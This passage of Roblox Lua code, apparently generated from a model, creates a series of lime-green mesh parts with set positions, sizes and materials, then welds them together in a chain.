b43 = Instance.new("SpecialMesh", p43)
b43.MeshId = "http://www.roblox.com/asset/?id=3270017"
b43.TextureId = ""
b43.MeshType = Enum.MeshType.FileMesh
b43.Name = "Mesh"
b43.Scale = Vector3.new(0.849326968, 0.849327147, 0.56621933)
p44 = Instance.new("Part", m2)
p44.BrickColor = BrickColor.new("Lime green")
p44.Material = Enum.Material.SmoothPlastic
p44.Reflectance = 0.30000001192093
p44.CFrame = CFrame.new(24.3630924, 24.6090679, 26.5687962, -0.573574483, -0.212014914, -0.791238487, -2.38912503e-006, -0.96592319, 0.258816421, -0.819151402, 0.148452118, 0.554032683)
p44.CanCollide = false
p44.FormFactor = Enum.FormFactor.Custom
p44.Size = Vector3.new(0.584050655, 0.584051132, 0.584051371)
p44.BottomSurface = Enum.SurfaceType.Smooth
p44.TopSurface = Enum.SurfaceType.Smooth
b44 = Instance.new("SpecialMesh", p44)
b44.MeshId = "http://www.roblox.com/asset/?id=3270017"
b44.TextureId = ""
b44.MeshType = Enum.MeshType.FileMesh
b44.Name = "Mesh"
b44.Scale = Vector3.new(0.283109009, 0.283109039, 0.283109665)
p45 = Instance.new("Part", m2)
p45.BrickColor = BrickColor.new("Lime green")
p45.Material = Enum.Material.SmoothPlastic
p45.Reflectance = 0.30000001192093
p45.CFrame = CFrame.new(24.2399025, 24.6493645, 26.6550598, -0.573574483, -0.212014928, -0.791238487, -2.46828859e-006, -0.965923131, 0.258816421, -0.819151402, 0.148452014, 0.554032683)
p45.CanCollide = false
p45.FormFactor = Enum.FormFactor.Custom
p45.Size = Vector3.new(0.585091829, 0.622839987, 0.584051371)
p45.BottomSurface = Enum.SurfaceType.Smooth
p45.TopSurface = Enum.SurfaceType.Smooth
b45 = Instance.new("SpecialMesh", p45)
b45.MeshId = "http://www.roblox.com/asset/?id=3270017"
b45.TextureId = ""
b45.MeshType = Enum.MeshType.FileMesh
b45.Name = "Mesh"
b45.Scale = Vector3.new(0.585091829, 0.622839928, 0.301983595)
p46 = Instance.new("Part", m2)
p46.BrickColor = BrickColor.new("Lime green")
p46.Material = Enum.Material.SmoothPlastic
p46.Reflectance = 0.30000001192093
p46.CFrame = CFrame.new(24.3630962, 24.6090736, 26.5688019, -0.573574483, -0.212014943, -0.791238487, -2.54745214e-006, -0.965923071, 0.258816421, -0.819151402, 0.148451909, 0.554032683)
p46.CanCollide = false
p46.FormFactor = Enum.FormFactor.Custom
p46.Size = Vector3.new(0.584050655, 0.584051132, 0.584051371)
p46.BottomSurface = Enum.SurfaceType.Smooth
p46.TopSurface = Enum.SurfaceType.Smooth
b46 = Instance.new("SpecialMesh", p46)
b46.MeshId = "http://www.roblox.com/asset/?id=3270017"
b46.TextureId = ""
b46.MeshType = Enum.MeshType.FileMesh
b46.Name = "Mesh"
b46.Scale = Vector3.new(0.283109009, 0.283109039, 0.283109665)
p47 = Instance.new("Part", m2)
p47.BrickColor = BrickColor.new("Lime green")
p47.Material = Enum.Material.SmoothPlastic
p47.Reflectance = 0.30000001192093
p47.CFrame = CFrame.new(24.2399063, 24.6493702, 26.6550655, -0.573574483, -0.212014958, -0.791238487, -2.6266157e-006, -0.965923011, 0.258816421, -0.819151402, 0.148451805, 0.554032683)
p47.CanCollide = false
p47.FormFactor = Enum.FormFactor.Custom
p47.Size = Vector3.new(0.585091829, 0.622839987, 0.584051371)
p47.BottomSurface = Enum.SurfaceType.Smooth
p47.TopSurface = Enum.SurfaceType.Smooth
b47 = Instance.new("SpecialMesh", p47)
b47.MeshId = "http://www.roblox.com/asset/?id=3270017"
b47.TextureId = ""
b47.MeshType = Enum.MeshType.FileMesh
b47.Name = "Mesh"
b47.Scale = Vector3.new(0.585091829, 0.622839928, 0.301983595)
p48 = Instance.new("Part", m2)
p48.BrickColor = BrickColor.new("Lime green")
p48.Material = Enum.Material.Neon
p48.CFrame = CFrame.new(25.2453995, 27.8142643, 25.9324112, 0.579229355, 0.579225123, -0.573574543, 0.707105756, -0.707103014, -2.67389237e-006, -0.405579329, -0.40558058, -0.819151223)
p48.FormFactor = Enum.FormFactor.Custom
p48.Size = Vector3.new(0.61060679, 3.09150696, 0.221234918)
p48.BottomSurface = Enum.SurfaceType.Smooth
p48.TopSurface = Enum.SurfaceType.Smooth
b48 = Instance.new("SpecialMesh", p48)
b48.MeshType = Enum.MeshType.Sphere
b48.Name = "Mesh"
p49 = Instance.new("Part", m2)
p49.BrickColor = BrickColor.new("Lime green")
p49.Material = Enum.Material.SmoothPlastic
p49.Reflectance = 0.30000001192093
p49.CFrame = CFrame.new(26.2033863, 25.7751026, 25.2802086, -0.573574364, -0.469848186, -0.671007454, -2.67389191e-006, -0.819150448, 0.573572874, -0.819151223, 0.328989238, 0.469846845)
p49.CanCollide = false
p49.FormFactor = Enum.FormFactor.Custom
p49.Size = Vector3.new(0.584050655, 0.584051132, 0.584051371)
p49.BottomSurface = Enum.SurfaceType.Smooth
p49.TopSurface = Enum.SurfaceType.Smooth
b49 = Instance.new("SpecialMesh", p49)
b49.MeshId = "http://www.roblox.com/asset/?id=3270017"
b49.TextureId = ""
b49.MeshType = Enum.MeshType.FileMesh
b49.Name = "Mesh"
b49.Scale = Vector3.new(0.283109009, 0.283109039, 0.283109665)
p50 = Instance.new("Part", m2)
p50.BrickColor = BrickColor.new("Lime green")
p50.Material = Enum.Material.SmoothPlastic
p50.Reflectance = 0.30000001192093
p50.CFrame = CFrame.new(25.9976063, 25.9510059, 25.4242992, -0.573574364, -0.469848186, -0.671007454, -2.67389191e-006, -0.819150448, 0.573572874, -0.819151223, 0.328989238, 0.469846845)
p50.CanCollide = false
p50.FormFactor = Enum.FormFactor.Custom
p50.Size = Vector3.new(0.849326968, 0.849327147, 0.584051371)
p50.BottomSurface = Enum.SurfaceType.Smooth
p50.TopSurface = Enum.SurfaceType.Smooth
b50 = Instance.new("SpecialMesh", p50)
b50.MeshId = "http://www.roblox.com/asset/?id=3270017"
b50.TextureId = ""
b50.MeshType = Enum.MeshType.FileMesh
b50.Name = "Mesh"
b50.Scale = Vector3.new(0.849326968, 0.849327147, 0.56621933)
p51 = Instance.new("Part", m2)
p51.BrickColor = BrickColor.new("Lime green")
p51.Material = Enum.Material.SmoothPlastic
p51.Reflectance = 0.30000001192093
p51.CFrame = CFrame.new(26.0989265, 25.8644028, 25.353363, -0.573574364, -0.469848186, -0.671007454, -2.67389191e-006, -0.819150448, 0.573572874, -0.819151223, 0.328989238, 0.469846845)
p51.CanCollide = false
p51.FormFactor = Enum.FormFactor.Custom
p51.Size = Vector3.new(0.585091829, 0.622839987, 0.584051371)
p51.BottomSurface = Enum.SurfaceType.Smooth
p51.TopSurface = Enum.SurfaceType.Smooth
b51 = Instance.new("SpecialMesh", p51)
b51.MeshId = "http://www.roblox.com/asset/?id=3270017"
b51.TextureId = ""
b51.MeshType = Enum.MeshType.FileMesh
b51.Name = "Mesh"
b51.Scale = Vector3.new(0.585091829, 0.622839928, 0.301983595)
p52 = Instance.new("Part", m2)
p52.BrickColor = BrickColor.new("Lime green")
p52.Material = Enum.Material.Neon
p52.CFrame = CFrame.new(21.2912331, 25.2490387, 28.7011547, 0.142246991, 0.806705594, -0.573574483, 0.984804809, -0.173645705, -2.66166035e-006, -0.0995996594, -0.564862788, -0.819151103)
p52.FormFactor = Enum.FormFactor.Custom
p52.Size = Vector3.new(0.61060679, 7.32508755, 0.221234918)
p52.BottomSurface = Enum.SurfaceType.Smooth
p52.TopSurface = Enum.SurfaceType.Smooth
b52 = Instance.new("SpecialMesh", p52)
b52.MeshType = Enum.MeshType.Sphere
b52.Name = "Mesh"
p53 = Instance.new("Part", m2)
p53.BrickColor = BrickColor.new("Lime green")
p53.Material = Enum.Material.Neon
p53.CFrame = CFrame.new(23.2582321, 27.8460655, 27.3238525, 0.409577936, 0.709403872, -0.573574483, 0.866023481, -0.499996662, -2.64914797e-006, -0.28678745, -0.496732205, -0.819151103)
p53.FormFactor = Enum.FormFactor.Custom
p53.Size = Vector3.new(0.61060679, 7.32508755, 0.221234918)
p53.BottomSurface = Enum.SurfaceType.Smooth
p53.TopSurface = Enum.SurfaceType.Smooth
b53 = Instance.new("SpecialMesh", p53)
b53.MeshType = Enum.MeshType.Sphere
b53.Name = "Mesh"
p54 = Instance.new("Part", m2)
p54.BrickColor = BrickColor.new("Lime green")
p54.Material = Enum.Material.Neon
p54.CFrame = CFrame.new(21.2899132, 27.1965466, 28.7020855, 0.280168742, 0.769748747, -0.573574483, 0.939690113, -0.342017204, -2.64914797e-006, -0.196173787, -0.538985729, -0.819151103)
p54.FormFactor = Enum.FormFactor.Custom
p54.Size = Vector3.new(0.61060679, 8.03632927, 0.221234918)
p54.BottomSurface = Enum.SurfaceType.Smooth
p54.TopSurface = Enum.SurfaceType.Smooth
b54 = Instance.new("SpecialMesh", p54)
b54.MeshType = Enum.MeshType.Sphere
b54.Name = "Mesh"
p55 = Instance.new("Part", m2)
p55.BrickColor = BrickColor.new("Lime green")
p55.Material = Enum.Material.Neon
p55.CFrame = CFrame.new(22.732933, 23.2277641, 27.6916542, -0.280163169, 0.769749939, -0.573574483, 0.939688265, 0.342020243, -2.67457881e-006, 0.196175426, -0.538984358, -0.819150984)
p55.FormFactor = Enum.FormFactor.Custom
p55.Size = Vector3.new(0.61060679, 3.09150696, 0.221234918)
p55.BottomSurface = Enum.SurfaceType.Smooth
p55.TopSurface = Enum.SurfaceType.Smooth
b55 = Instance.new("SpecialMesh", p55)
b55.MeshType = Enum.MeshType.Sphere
b55.Name = "Mesh"
p56 = Instance.new("Part", m2)
p56.BrickColor = BrickColor.new("Lime green")
p56.Material = Enum.Material.SmoothPlastic
p56.Reflectance = 0.30000001192093
p56.CFrame = CFrame.new(26.1728668, 26.7314224, 25.3015804, -0.573574424, -0.469846636, -0.671006322, -2.71658587e-006, -0.819149017, 0.573572636, -0.819150925, 0.328987926, 0.469845742)
p56.CanCollide = false
p56.FormFactor = Enum.FormFactor.Custom
p56.Size = Vector3.new(0.585091829, 0.622839987, 0.584051371)
p56.BottomSurface = Enum.SurfaceType.Smooth
p56.TopSurface = Enum.SurfaceType.Smooth
b56 = Instance.new("SpecialMesh", p56)
b56.MeshId = "http://www.roblox.com/asset/?id=3270017"
b56.TextureId = ""
b56.MeshType = Enum.MeshType.FileMesh
b56.Name = "Mesh"
b56.Scale = Vector3.new(0.585091829, 0.622839928, 0.301983595)
p57 = Instance.new("Part", m2)
p57.BrickColor = BrickColor.new("Lime green")
p57.Material = Enum.Material.SmoothPlastic
p57.Reflectance = 0.30000001192093
p57.CFrame = CFrame.new(26.0715504, 26.8180256, 25.3725224, -0.573574424, -0.469846636, -0.671006322, -2.71658587e-006, -0.819149017, 0.573572636, -0.819150925, 0.328987926, 0.469845742)
p57.CanCollide = false
p57.FormFactor = Enum.FormFactor.Custom
p57.Size = Vector3.new(0.849326968, 0.849327147, 0.584051371)
p57.BottomSurface = Enum.SurfaceType.Smooth
p57.TopSurface = Enum.SurfaceType.Smooth
b57 = Instance.new("SpecialMesh", p57)
b57.MeshId = "http://www.roblox.com/asset/?id=3270017"
b57.TextureId = ""
b57.MeshType = Enum.MeshType.FileMesh
b57.Name = "Mesh"
b57.Scale = Vector3.new(0.849326968, 0.849327147, 0.56621933)
p58 = Instance.new("Part", m2)
p58.BrickColor = BrickColor.new("Lime green")
p58.Material = Enum.Material.SmoothPlastic
p58.Reflectance = 0.30000001192093
p58.CFrame = CFrame.new(26.2773418, 26.6421242, 25.2284393, -0.573574424, -0.469846636, -0.671006322, -2.71658587e-006, -0.819149017, 0.573572636, -0.819150925, 0.328987926, 0.469845742)
p58.CanCollide = false
p58.FormFactor = Enum.FormFactor.Custom
p58.Size = Vector3.new(0.584050655, 0.584051132, 0.584051371)
p58.BottomSurface = Enum.SurfaceType.Smooth
p58.TopSurface = Enum.SurfaceType.Smooth
b58 = Instance.new("SpecialMesh", p58)
b58.MeshId = "http://www.roblox.com/asset/?id=3270017"
b58.TextureId = ""
b58.MeshType = Enum.MeshType.FileMesh
b58.Name = "Mesh"
b58.Scale = Vector3.new(0.283109009, 0.283109039, 0.283109665)
p59 = Instance.new("Part", m2)
p59.BrickColor = BrickColor.new("Lime green")
p59.Material = Enum.Material.SmoothPlastic
p59.Reflectance = 0.30000001192093
p59.CFrame = CFrame.new(24.6884308, 25.7025909, 26.3410091, -0.573574424, -0.280167818, -0.769747615, -2.71658587e-006, -0.939688742, 0.342017263, -0.819150925, 0.196172908, 0.538984478)
p59.CanCollide = false
p59.FormFactor = Enum.FormFactor.Custom
p59.Size = Vector3.new(0.584050655, 0.584051132, 0.584051371)
p59.BottomSurface = Enum.SurfaceType.Smooth
p59.TopSurface = Enum.SurfaceType.Smooth
b59 = Instance.new("SpecialMesh", p59)
b59.MeshId = "http://www.roblox.com/asset/?id=3270017"
b59.TextureId = ""
b59.MeshType = Enum.MeshType.FileMesh
b59.Name = "Mesh"
b59.Scale = Vector3.new(0.283109009, 0.283109039, 0.283109665)
p60 = Instance.new("Part", m2)
p60.BrickColor = BrickColor.new("Lime green")
p60.Material = Enum.Material.SmoothPlastic
p60.Reflectance = 0.30000001192093
p60.CFrame = CFrame.new(24.4523582, 25.807478, 26.5063095, -0.573574424, -0.280167848, -0.769747615, -2.7445908e-006, -0.939688742, 0.342017263, -0.819150925, 0.196172863, 0.538984478)
p60.CanCollide = false
p60.FormFactor = Enum.FormFactor.Custom
p60.Size = Vector3.new(0.849326968, 0.849327147, 0.584051371)
p60.BottomSurface = Enum.SurfaceType.Smooth
p60.TopSurface = Enum.SurfaceType.Smooth
b60 = Instance.new("SpecialMesh", p60)
b60.MeshId = "http://www.roblox.com/asset/?id=3270017"
b60.TextureId = ""
b60.MeshType = Enum.MeshType.FileMesh
b60.Name = "Mesh"
b60.Scale = Vector3.new(0.849326968, 0.849327147, 0.56621933)
p61 = Instance.new("Part", m2)
p61.BrickColor = BrickColor.new("Lime green")
p61.Material = Enum.Material.SmoothPlastic
p61.Reflectance = 0.30000001192093
p61.CFrame = CFrame.new(24.5685883, 25.7558403, 26.4249287, -0.573574424, -0.280167878, -0.769747615, -2.77259574e-006, -0.939688742, 0.342017263, -0.819150925, 0.196172819, 0.538984478)
p61.CanCollide = false
p61.FormFactor = Enum.FormFactor.Custom
p61.Size = Vector3.new(0.585091829, 0.622839987, 0.584051371)
p61.BottomSurface = Enum.SurfaceType.Smooth
p61.TopSurface = Enum.SurfaceType.Smooth
b61 = Instance.new("SpecialMesh", p61)
b61.MeshId = "http://www.roblox.com/asset/?id=3270017"
b61.TextureId = ""
b61.MeshType = Enum.MeshType.FileMesh
b61.Name = "Mesh"
b61.Scale = Vector3.new(0.585091829, 0.622839928, 0.301983595)
p62 = Instance.new("Part", m2)
p62.BrickColor = BrickColor.new("Lime green")
p62.Material = Enum.Material.SmoothPlastic
p62.Reflectance = 0.30000001192093
p62.CFrame = CFrame.new(24.6884365, 25.7025948, 26.3410149, -0.573574424, -0.280167907, -0.769747615, -2.80060067e-006, -0.939688742, 0.342017263, -0.819150925, 0.196172774, 0.538984478)
p62.CanCollide = false
p62.FormFactor = Enum.FormFactor.Custom
p62.Size = Vector3.new(0.584050655, 0.584051132, 0.584051371)
p62.BottomSurface = Enum.SurfaceType.Smooth
p62.TopSurface = Enum.SurfaceType.Smooth
b62 = Instance.new("SpecialMesh", p62)
b62.MeshId = "http://www.roblox.com/asset/?id=3270017"
b62.TextureId = ""
b62.MeshType = Enum.MeshType.FileMesh
b62.Name = "Mesh"
b62.Scale = Vector3.new(0.283109009, 0.283109039, 0.283109665)
p63 = Instance.new("Part", m2)
p63.BrickColor = BrickColor.new("Lime green")
p63.Material = Enum.Material.SmoothPlastic
p63.Reflectance = 0.30000001192093
p63.CFrame = CFrame.new(24.452364, 25.8074818, 26.5063152, -0.573574424, -0.280167937, -0.769747615, -2.8286056e-006, -0.939688742, 0.342017263, -0.819150925, 0.196172729, 0.538984478)
p63.CanCollide = false
p63.FormFactor = Enum.FormFactor.Custom
p63.Size = Vector3.new(0.849326968, 0.849327147, 0.584051371)
p63.BottomSurface = Enum.SurfaceType.Smooth
p63.TopSurface = Enum.SurfaceType.Smooth
b63 = Instance.new("SpecialMesh", p63)
b63.MeshId = "http://www.roblox.com/asset/?id=3270017"
b63.TextureId = ""
b63.MeshType = Enum.MeshType.FileMesh
b63.Name = "Mesh"
b63.Scale = Vector3.new(0.849326968, 0.849327147, 0.56621933)
p64 = Instance.new("Part", m2)
p64.BrickColor = BrickColor.new("Lime green")
p64.Material = Enum.Material.SmoothPlastic
p64.Reflectance = 0.30000001192093
p64.CFrame = CFrame.new(24.568594, 25.7558441, 26.4249344, -0.573574424, -0.280167967, -0.769747615, -2.85661054e-006, -0.939688742, 0.342017263, -0.819150925, 0.196172684, 0.538984478)
p64.CanCollide = false
p64.FormFactor = Enum.FormFactor.Custom
p64.Size = Vector3.new(0.585091829, 0.622839987, 0.584051371)
p64.BottomSurface = Enum.SurfaceType.Smooth
p64.TopSurface = Enum.SurfaceType.Smooth
b64 = Instance.new("SpecialMesh", p64)
b64.MeshId = "http://www.roblox.com/asset/?id=3270017"
b64.TextureId = ""
b64.MeshType = Enum.MeshType.FileMesh
b64.Name = "Mesh"
b64.Scale = Vector3.new(0.585091829, 0.622839928, 0.301983595)
p65 = Instance.new("Part", m2)
p65.BrickColor = BrickColor.new("Really black")
p65.Transparency = 1
p65.Name = "TorsoPart"
p65.CFrame = CFrame.new(27.0399818, 25.1251049, 25.3600311, 0.999996543, 2.59280205e-006, 8.94069672e-008, 2.77161598e-006, 0.999995351, 1.56462193e-006, 6.2584877e-007, 1.51991844e-006, 0.999998093)
p65.FormFactor = Enum.FormFactor.Symmetric
p65.Size = Vector3.new(4, 4, 2)
w1 = Instance.new("Weld", p1)
w1.Name = "Part_Weld"
w1.Part0 = p1
w1.C0 = CFrame.new(7.48623466, 46.9062119, -4.72964478, -0.579227924, 0.707106769, -0.405579776, -0.579227805, -0.707106769, -0.405579716, -0.573576331, 0, 0.819152117)
w1.Part1 = p2
w1.C1 = CFrame.new(35.7379875, 19.7860374, 13.782176, -0.573576331, -1.03064551e-007, -0.819152117, 0.346188396, -0.906307817, -0.24240382, -0.742403984, -0.422618032, 0.519836664)
w2 = Instance.new("Weld", p2)
w2.Name = "Part_Weld"
w2.Part0 = p2
w2.C0 = CFrame.new(35.7379875, 19.7860374, 13.782176, -0.573576331, -1.03064551e-007, -0.819152117, 0.346188396, -0.906307817, -0.24240382, -0.742403984, -0.422618032, 0.519836664)
w2.Part1 = p3
w2.C1 = CFrame.new(35.7379951, 19.7860336, 13.626483, -0.573576331, -1.03064551e-007, -0.819152117, 0.346188396, -0.906307817, -0.24240382, -0.742403984, -0.422618032, 0.519836664)
w3 = Instance.new("Weld", p3)
w3.Name = "Part_Weld"
w3.Part0 = p3
w3.C0 = CFrame.new(35.7379951, 19.7860336, 13.626483, -0.573576331, -1.03064551e-007, -0.819152117, 0.346188396, -0.906307817, -0.24240382, -0.742403984, -0.422618032, 0.519836664)
w3.Part1 = p4
w3.C1 = CFrame.new(-4.6974678, 10.7812996, -45.834713, -0.573576748, 0, 0.819151878, 0.280166447, -0.939692616, 0.1961748, 0.769751072, 0.342020154, 0.538985789)
w4 = Instance.new("Weld", p4)
w4.Name = "Part_Weld"
w4.Part0 = p4
w4.C0 = CFrame.new(-4.6974678, 10.7812996, -45.834713, -0.573576748, 0, 0.819151878, 0.280166447, -0.939692616, 0.1961748, 0.769751072, 0.342020154, 0.538985789)
w4.Part1 = p5
w4.C1 = CFrame.new(35.7379875, 19.7860374, 13.782176, -0.573576331, -1.03064551e-007, -0.819152117, 0.346188396, -0.906307817, -0.24240382, -0.742403984, -0.422618032, 0.519836664)
w5 = Instance.new("Weld", p5)
w5.Name = "Part_Weld"
w5.Part0 = p5
w5.C0 = CFrame.new(35.7379875, 19.7860374, 13.782176, -0.573576331, -1.03064551e-007, -0.819152117, 0.346188396, -0.906307817, -0.24240382, -0.742403984, -0.422618032, 0.519836664)
w5.Part1 = p6
w5.C1 = CFrame.new(35.7379951, 19.7860374, 13.4754944, -0.573576331, -1.03064551e-007, -0.819152117, 0.346188396, -0.906307817, -0.24240382, -0.742403984, -0.422618032, 0.519836664)
w6 = Instance.new("Weld", p6)
w6.Name = "Part_Weld"
w6.Part0 = p6
w6.C0 = CFrame.new(35.7379951, 19.7860374, 13.4754944, -0.573576331, -1.03064551e-007, -0.819152117, 0.346188396, -0.906307817, -0.24240382, -0.742403984, -0.422618032, 0.519836664)
w6.Part1 = p7
w6.C1 = CFrame.new(35.7379951, 19.7860336, 13.626483, -0.573576331, -1.03064551e-007, -0.819152117, 0.346188396, -0.906307817, -0.24240382, -0.742403984, -0.422618032, 0.519836664)
w7 = Instance.new("Weld", p7)
w7.Name = "Part_Weld"
w7.Part0 = p7
w7.C0 = CFrame.new(35.7379951, 19.7860336, 13.626483, -0.573576331, -1.03064551e-007, -0.819152117, 0.346188396, -0.906307817, -0.24240382, -0.742403984, -0.422618032, 0.519836664)
w7.Part1 = p8
w7.C1 = CFrame.new(35.7379951, 19.7860374, 13.4754944, -0.573576331, -1.03064551e-007, -0.819152117, 0.346188396, -0.906307817, -0.24240382, -0.742403984, -0.422618032, 0.519836664)
w8 = Instance.new("Weld", p8)
w8.Name = "Part_Weld"
w8.Part0 = p8
w8.C0 = CFrame.new(35.7379951, 19.7860374, 13.4754944, -0.573576331, -1.03064551e-007, -0.819152117, 0.346188396, -0.906307817, -0.24240382, -0.742403984, -0.422618032, 0.519836664)
w8.Part1 = p9
w8.C1 = CFrame.new(-4.69746971, 38.4699516, -26.4413414, -0.573576748, -1.03064551e-007, 0.819151878, -0.346188426, -0.906307817, -0.242403746, 0.742403686, -0.422618032, 0.519837141)
w9 = Instance.new("Weld", p9)
w9.Name = "Part_Weld"
w9.Part0 = p9
w9.C0 = CFrame.new(-4.69746971, 38.4699516, -26.4413414, -0.573576748, -1.03064551e-007, 0.819151878, -0.346188426, -0.906307817, -0.242403746, 0.742403686, -0.422618032, 0.519837141)
w9.Part1 = p10
w9.C1 = CFrame.new(-4.6974659, 0.512617111, -46.0237579, -0.573576748, 0, 0.819151878, 0.469846189, -0.819152057, 0.328990072, 0.671009898, 0.57357645, 0.469846576)
w10 = Instance.new("Weld", p10)
w10.Name = "Part_Weld"
w10.Part0 = p10
w10.C0 = CFrame.new(-4.6974659, 0.512617111, -46.0237579, -0.573576748, 0, 0.819151878, 0.469846189, -0.819152057, 0.328990072, 0.671009898, 0.57357645, 0.469846576)
w10.Part1 = p11
w10.C1 = CFrame.new(-4.69746971, -0.249427795, -45.2937202, -0.573576748, 0, 0.819151878, 0.469846189, -0.819152057, 0.328990072, 0.671009898, 0.57357645, 0.469846576)
w11 = Instance.new("Weld", p11)
w11.Name = "Part_Weld"
w11.Part0 = p11
w11.C0 = CFrame.new(-4.69746971, -0.249427795, -45.2937202, -0.573576748, 0, 0.819151878, 0.469846189, -0.819152057, 0.328990072, 0.671009898, 0.57357645, 0.469846576)
w11.Part1 = p12
w11.C1 = CFrame.new(-4.69746971, 13.5492201, -44.5157242, -0.573576748, -2.87868307e-008, 0.819151878, 0.212012202, -0.965925753, 0.148452699, 0.791239858, 0.258819222, 0.554032564)
w12 = Instance.new("Weld", p12)
w12.Name = "Part_Weld"
w12.Part0 = p12
w12.C0 = CFrame.new(-4.69746971, 13.5492201, -44.5157242, -0.573576748, -2.87868307e-008, 0.819151878, 0.212012202, -0.965925753, 0.148452699, 0.791239858, 0.258819222, 0.554032564)
w12.Part1 = p13
w12.C1 = CFrame.new(-4.69747162, -0.249425888, -45.4494095, -0.573576748, 0, 0.819151878, 0.469846189, -0.819152057, 0.328990072, 0.671009898, 0.57357645, 0.469846576)
w13 = Instance.new("Weld", p13)
w13.Name = "Part_Weld"
w13.Part0 = p13
w13.C0 = CFrame.new(-4.69747162, -0.249425888, -45.4494095, -0.573576748, 0, 0.819151878, 0.469846189, -0.819152057, 0.328990072, 0.671009898, 0.57357645, 0.469846576)
w13.Part1 = p14
w13.C1 = CFrame.new(-4.6974678, 13.5492172, -44.6714172, -0.573576748, -2.87868307e-008, 0.819151878, 0.212012202, -0.965925753, 0.148452699, 0.791239858, 0.258819222, 0.554032564)
w14 = Instance.new("Weld", p14)
w14.Name = "Part_Weld"
w14.Part0 = p14
w14.C0 = CFrame.new(-4.6974678, 13.5492172, -44.6714172, -0.573576748, -2.87868307e-008, 0.819151878, 0.212012202, -0.965925753, 0.148452699, 0.791239858, 0.258819222, 0.554032564)
w14.Part1 = p15
w14.C1 = CFrame.new(-4.69747162, 10.7813034, -45.5280304, -0.573576748, 0, 0.819151878, 0.280166447, -0.939692616, 0.1961748, 0.769751072, 0.342020154, 0.538985789)
w15 = Instance.new("Weld", p15)
w15.Name = "Part_Weld"
w15.Part0 = p15
w15.C0 = CFrame.new(-4.69747162, 10.7813034, -45.5280304, -0.573576748, 0, 0.819151878, 0.280166447, -0.939692616, 0.1961748, 0.769751072, 0.342020154, 0.538985789)
w15.Part1 = p16
w15.C1 = CFrame.new(-4.69746971, 13.5492172, -44.8224106, -0.573576748, -2.87868307e-008, 0.819151878, 0.212012202, -0.965925753, 0.148452699, 0.791239858, 0.258819222, 0.554032564)
w16 = Instance.new("Weld", p16)
w16.Name = "Part_Weld"
w16.Part0 = p16
w16.C0 = CFrame.new(-4.69746971, 13.5492172, -44.8224106, -0.573576748, -2.87868307e-008, 0.819151878, 0.212012202, -0.965925753, 0.148452699, 0.791239858, 0.258819222, 0.554032564)
w16.Part1 = p17
w16.C1 = CFrame.new(-4.6974678, 10.7812996, -45.834713, -0.573576748, 0, 0.819151878, 0.280166447, -0.939692616, 0.1961748, 0.769751072, 0.342020154, 0.538985789)
w17 = Instance.new("Weld", p17)
w17.Name = "Part_Weld"
w17.Part0 = p17
w17.C0 = CFrame.new(-4.6974678, 10.7812996, -45.834713, -0.573576748, 0, 0.819151878, 0.280166447, -0.939692616, 0.1961748, 0.769751072, 0.342020154, 0.538985789)
w17.Part1 = p18
w17.C1 = CFrame.new(-4.6974678, -0.249424934, -45.600399, -0.573576748, 0, 0.819151878, 0.469846189, -0.819152057, 0.328990072, 0.671009898, 0.57357645, 0.469846576)
w18 = Instance.new("Weld", p18)
w18.Name = "Part_Weld"
w18.Part0 = p18
w18.C0 = CFrame.new(-4.6974678, -0.249424934, -45.600399, -0.573576748, 0, 0.819151878, 0.469846189, -0.819152057, 0.328990072, 0.671009898, 0.57357645, 0.469846576)
w18.Part1 = p19
w18.C1 = CFrame.new(-4.6974678, 38.4699554, -26.5923309, -0.573576748, -1.03064551e-007, 0.819151878, -0.346188426, -0.906307817, -0.242403746, 0.742403686, -0.422618032, 0.519837141)
w19 = Instance.new("Weld", p19)
w19.Name = "Part_Weld"
w19.Part0 = p19
w19.C0 = CFrame.new(-4.6974678, 38.4699554, -26.5923309, -0.573576748, -1.03064551e-007, 0.819151878, -0.346188426, -0.906307817, -0.242403746, 0.742403686, -0.422618032, 0.519837141)
w19.Part1 = p20
w19.C1 = CFrame.new(-4.69746971, 38.4699516, -26.4413414, -0.573576748, -1.03064551e-007, 0.819151878, -0.346188426, -0.906307817, -0.242403746, 0.742403686, -0.422618032, 0.519837141)
w20 = Instance.new("Weld", p20)
w20.Name = "Part_Weld"
w20.Part0 = p20
w20.C0 = CFrame.new(-4.69746971, 38.4699516, -26.4413414, -0.573576748, -1.03064551e-007, 0.819151878, -0.346188426, -0.906307817, -0.242403746, 0.742403686, -0.422618032, 0.519837141)
w20.Part1 = p21
w20.C1 = CFrame.new(-4.69746971, 0.512615204, -45.8727722, -0.573576748, 0, 0.819151878, 0.469846189, -0.819152057, 0.328990072, 0.671009898, 0.57357645, 0.469846576)
w21 = Instance.new("Weld", p21)
w21.Name = "Part_Weld"
w21.Part0 = p21
w21.C0 = CFrame.new(-4.69746971, 0.512615204, -45.8727722, -0.573576748, 0, 0.819151878, 0.469846189, -0.819152057, 0.328990072, 0.671009898, 0.57357645, 0.469846576)
w21.Part1 = p22
w21.C1 = CFrame.new(-4.69746971, 38.4699554, -26.2856503, -0.573576748, -1.03064551e-007, 0.819151878, -0.346188426, -0.906307817, -0.242403746, 0.742403686, -0.422618032, 0.519837141)
w22 = Instance.new("Weld", p22)
w22.Name = "Part_Weld"
w22.Part0 = p22
w22.C0 = CFrame.new(-4.69746971, 38.4699554, -26.2856503, -0.573576748, -1.03064551e-007, 0.819151878, -0.346188426, -0.906307817, -0.242403746, 0.742403686, -0.422618032, 0.519837141)
w22.Part1 = p23
w22.C1 = CFrame.new(-4.69747162, 10.7813015, -45.6837234, -0.573576748, 0, 0.819151878, 0.280166447, -0.939692616, 0.1961748, 0.769751072, 0.342020154, 0.538985789)
w23 = Instance.new("Weld", p23)
w23.Name = "Part_Weld"
w23.Part0 = p23
w23.C0 = CFrame.new(-4.69747162, 10.7813015, -45.6837234, -0.573576748, 0, 0.819151878, 0.280166447, -0.939692616, 0.1961748, 0.769751072, 0.342020154, 0.538985789)
w23.Part1 = p24
w23.C1 = CFrame.new(-4.69747162, 10.7813034, -45.5280304, -0.573576748, 0, 0.819151878, 0.280166447, -0.939692616, 0.1961748, 0.769751072, 0.342020154, 0.538985789)
w24 = Instance.new("Weld", p24)
w24.Name = "Part_Weld"
w24.Part0 = p24
w24.C0 = CFrame.new(-4.69747162, 10.7813034, -45.5280304, -0.573576748, 0, 0.819151878, 0.280166447, -0.939692616, 0.1961748, 0.769751072, 0.342020154, 0.538985789)
w24.Part1 = p25
w24.C1 = CFrame.new(-4.6974678, 13.5492172, -44.6714172, -0.573576748, -2.87868307e-008, 0.819151878, 0.212012202, -0.965925753, 0.148452699, 0.791239858, 0.258819222, 0.554032564)
w25 = Instance.new("Weld", p25)
